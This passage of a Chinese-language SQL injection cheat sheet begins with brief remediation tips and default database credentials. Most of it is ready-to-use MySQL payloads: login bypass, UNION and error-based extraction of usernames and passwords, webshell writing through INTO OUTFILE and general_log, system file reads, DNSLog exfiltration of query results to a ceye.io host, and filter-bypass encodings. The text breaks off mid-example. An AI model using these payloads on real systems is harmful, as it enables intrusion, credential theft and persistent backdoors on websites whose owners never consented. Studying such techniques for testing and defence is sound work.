修复建议</h2><ul><li>使用参数化查询，将查询逻辑与查询数据分离。</li><li>严格限定参数类型和格式，明确参数校验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</li><li>替换或删除敏感字符或字符串。</li><li>将动态 SQL 语句替换为存储过程。</li><li>验证输入，即白/黑名单验证。</li><li>最小化 SQL 权限。</li><li>一致的错误消息机制，屏蔽出错信息。</li></ul><h2 id="常见数据库" tabindex="-1"><a class="header-anchor" href="#常见数据库" aria-hidden="true">#</a> 常见数据库</h2><table><thead><tr><th style="text-align:left;">数据库</th><th style="text-align:left;">默认端口</th><th style="text-align:left;">默认用户名</th></tr></thead><tbody><tr><td style="text-align:left;">MySQL</td><td style="text-align:left;">3306</td><td style="text-align:left;">root</td></tr><tr><td style="text-align:left;">MsSQL</td><td style="text-align:left;">1433</td><td style="text-align:left;">sa</td></tr><tr><td style="text-align:left;">Oracle</td><td style="text-align:left;">1521</td><td style="text-align:left;">sys/system</td></tr><tr><td style="text-align:left;">postgresql</td><td style="text-align:left;">5432</td><td style="text-align:left;">postgres</td></tr><tr><td style="text-align:left;">Redis</td><td style="text-align:left;">6379</td><td style="text-align:left;"></td></tr></tbody></table><h2 id="站库分离" tabindex="-1"><a class="header-anchor" href="#站库分离" aria-hidden="true">#</a> 站库分离</h2><ul><li>MySQL</li></ul><p>定位 web 端 IP 地址：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>PROCESSLIST<span class="token punctuation">;</span>
</code></pre></div><ul><li>MsSQL</li></ul><p>查询客户端主机名：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> host_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>查询服务端主机名：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> @<span class="token variable">@servername</span>
</code></pre></div><h2 id="mysql" tabindex="-1"><a class="header-anchor" href="#mysql" aria-hidden="true">#</a> MySQL</h2><h3 id="常用函数" tabindex="-1"><a class="header-anchor" href="#常用函数" aria-hidden="true">#</a> 常用函数</h3><ul><li>获取系统信息</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 当前用户名。</span>
<span class="token keyword">system_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 当前的用户名和主机名。</span>
<span class="token keyword">session_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 连接数据库的用户名。</span>
@<span class="token variable">@basedir</span>    <span class="token comment"># mysql 安装路径。</span>
@<span class="token variable">@datadir</span>    <span class="token comment"># 数据库路径。</span>
version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 返回当前数据库的版本信息。</span>
@<span class="token variable">@version_compile_os</span>	<span class="token comment"># 操作系统版本。</span>
</code></pre></div><ul><li>字符串连接</li></ul><p><code>concat</code> <code>concat_ws</code> <code>group_concat</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token string">&#39;\n&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>字符串操作</li></ul><p><code>substr</code> <code>mid</code> <code>left</code> <code>right</code> <code>locate</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># substr(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度；limit表示从记录中第n个开始（n&gt;=0)，取m条记录。</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># mid(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度</span>
<span class="token keyword">select</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># left(str,len)，str--&gt;字符串，len--&gt;长度，从左开始截取长度为len的字符串</span>
<span class="token keyword">select</span> <span class="token keyword">right</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># right(str,len)，str--&gt;字符串，len--&gt;长度，从右开始截取长度为len的字符串</span>
<span class="token keyword">select</span> locate<span class="token punctuation">(</span><span class="token string">&#39;security&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;1234security&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 返回第一个字符串在第二个字符串首次出现的位置。</span>
<span class="token keyword">select</span> strcmp<span class="token punctuation">(</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 比较两个字符串是否相等，相等返回 0，str1&gt;str2 返回1，str1&lt;str2 返回-1。</span>
</code></pre></div><ul><li>返回指定 ASCII 字符对应的值</li></ul><p><code>ascii</code> <code>ord</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> ord<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>返回指定数字对应的 ASCII 码</li></ul><p><code>char</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>计算相关</li></ul><p><code>length</code> <code>count</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 计算数据库名长度。</span>
<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>时间相关</li></ul><p><code>sleep</code> <code>if</code> <code>benchmark</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 睡眠5秒</span>
<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>locate<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># if(expr1,expr2,expr3)</span>
<span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span>sha<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># benchmark(loop_count,expr)，loop_count 表示循环次数，expr 执行的表达式。</span>
<span class="token keyword">select</span> get_lock<span class="token punctuation">(</span><span class="token string">&#39;test&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># get_lock(lock_name,timeout)，lock_name 表示锁名，timeout 表示超时时间。</span>
</code></pre></div><ul><li>注释方法</li></ul><p><code>#</code> <code>--+</code> <code>/* */</code> <code>/*! */</code> <code>/*!50000 */</code> MySQL 5 通用 带版本内联注释。</p><h3 id="注入语句" tabindex="-1"><a class="header-anchor" href="#注入语句" aria-hidden="true">#</a> 注入语句</h3><ul><li>万能密码</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span><span class="token string">&#39;a&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span>&#39;a
</code></pre></div><ul><li>UNION 注入</li></ul><ol><li>获取表名。</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ol start="2"><li>获取字段名。</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;users&#39;</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ol start="3"><li>获取字段值。</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ul><li>报错注入</li></ul><p><code>updatexml</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>UPDATEXML <span class="token punctuation">(</span>XML_document<span class="token punctuation">,</span> XPath_string<span class="token punctuation">,</span> new_value<span class="token punctuation">)</span> 改变文档中符合条件的节点的值。
XML_document：String 格式，为 XML 文档对象的名称。
XPath_string ：Xpath 格式的字符串。
new_value：String 格式，替换查找到的符合条件的数据。
</code></pre></div><ol><li>获取表名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ol start="2"><li>获取字段名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ </span>
</code></pre></div><p><code>extractvalue</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>Extractvalue<span class="token punctuation">(</span>xml_frag<span class="token punctuation">,</span> xpath_expr<span class="token punctuation">)</span> 函数使用 XPath 表示法从 XML 字符串中提取值。
xml_frag: 目标 xml 文档。
xpath_expr: 利用 Xpath 路径法表示的查找路径。
</code></pre></div><ol><li>获取表名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ol start="2"><li>获取字段名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+ </span>
</code></pre></div><p><code>floor</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>floor<span class="token punctuation">(</span>x<span class="token punctuation">)</span> 函数，向下取整<span class="token punctuation">,</span>返回一个不大于x的值。
</code></pre></div><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><h3 id="文件写入" tabindex="-1"><a class="header-anchor" href="#文件写入" aria-hidden="true">#</a> 文件写入</h3><ul><li>条件</li></ul><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 目录具有读写权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 网站绝对路径。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> <code>secure_file_pri</code>为空。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;&lt;?php @eval($_GET[x]);?&gt;&quot;</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:/Inetpub/wwwroot/cc.php&#39;</span>
</code></pre></div><p>写一句话木马：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&quot;E\\phpStudy\\PHPTutoral\\www\\1.php&quot;</span> <span class="token comment">--+</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&quot;E\\phpStudy\\PHPTutoral\\www\\1.php&quot;</span> <span class="token comment">--+</span>
</code></pre></div><p><code>outfile</code>和<code>dumpdile</code>的区别：</p><p><code>outfile</code>后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径,但是值的部分可以是 16 进制。在使用 outfile 时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在 \n 等字符,会自动转义成 \n,也就是会多加一个 \。outfile 函数可以导出多行，而 <code>dumpfile</code> 只能导出一行数据；outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。而使用 dumpfile 时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）。</p><p>堆叠注入写木马：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token comment"># 主要利用 mysql 日志来写 shell。</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">&quot;ON&quot;</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">&#39;C:/wamp64/www/ma.php&#39;</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="文件读取" tabindex="-1"><a class="header-anchor" href="#文件读取" aria-hidden="true">#</a> 文件读取</h3><ul><li>条件</li></ul><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 目录具有读写权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> <code>secure_file_pri</code>为空。</li></ul><p>读取<code>secure_file_priv</code>配置：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">&quot;secure_file_priv&quot;</span>
</code></pre></div><table><thead><tr><th style="text-align:left;">值</th><th style="text-align:left;">说明</th></tr></thead><tbody><tr><td style="text-align:left;"><code>null</code></td><td style="text-align:left;">不允许导入导出</td></tr><tr><td style="text-align:left;"><code>/tmp</code></td><td style="text-align:left;">只能在 /tmp 目录下导入导出</td></tr><tr><td style="text-align:left;"><code>空</code></td><td style="text-align:left;">允许导入导出</td></tr></tbody></table><p>写文件的时候还需要看 php.ini 里面 gpc 是否开启看，开启的情况下，特殊字符都会被转义。</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">&#39;c:\\window\\win.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;c:/boot.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token number">0x633a2f626f6f742e696e69</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;//ecma.io/1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># smb 协议。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;\\\\ecma.io\\1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># 可用于DNS隧道。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 可以列出 FreeBSD，Sunos 系统的根目录，char(47) 就是 &#39;/&#39;。</span>
</code></pre></div><h3 id="dnslog-外带" tabindex="-1"><a class="header-anchor" href="#dnslog-外带" aria-hidden="true">#</a> DNSLog 外带</h3><ul><li>条件</li></ul><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 目录具有读写权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> <code>secure_file_pri</code>为空。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> Windows 系统。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">&#39;\\\\&#39;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.27epx0.ceye.io\\abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ # 使用 Windows 下的 UNC 路径。</span>
</code></pre></div><p>相应的更换<code>select database()</code>查询语句便可以实现 DNS 外带的回显注入，其中 27epx0.ceye.io 为 ceye.io 平台给每个账号起的昵称。</p><h2 id="绕过技术" tabindex="-1"><a class="header-anchor" href="#绕过技术" aria-hidden="true">#</a> 绕过技术</h2><h3 id="空格绕过" tabindex="-1"><a class="header-anchor" href="#空格绕过" aria-hidden="true">#</a> 空格绕过</h3><p>两个空格代替一个空格，用 Tab 代替空格，<code>%a0</code> = 空格：</p><ul><li>%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/</li></ul><p>使用注释替换空格：</p><ul><li>/**/</li></ul><p><img src="/images/252e775042ff8d4fe13b7964ed95b885.png" alt=""></p><p>使用浮点数：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8</span>E0union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8.0</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="括号绕过" tabindex="-1"><a class="header-anchor" href="#括号绕过" aria-hidden="true">#</a> 括号绕过</h3><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> dual <span class="token keyword">where</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>这种过滤方法常常用于 time based 盲注，例如：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">and</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token punctuation">;</span>
</code></pre></div><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><p>from for 属于逗号绕过。</p></div><h3 id="引号绕过" tabindex="-1"><a class="header-anchor" href="#引号绕过" aria-hidden="true">#</a> 引号绕过</h3><p>会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条 sql 语句，这条语句就是一个简单的用来查选得到 users 表中所有字段的一条语句：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">&quot;users&quot;</span><span class="token punctuation">;</span>
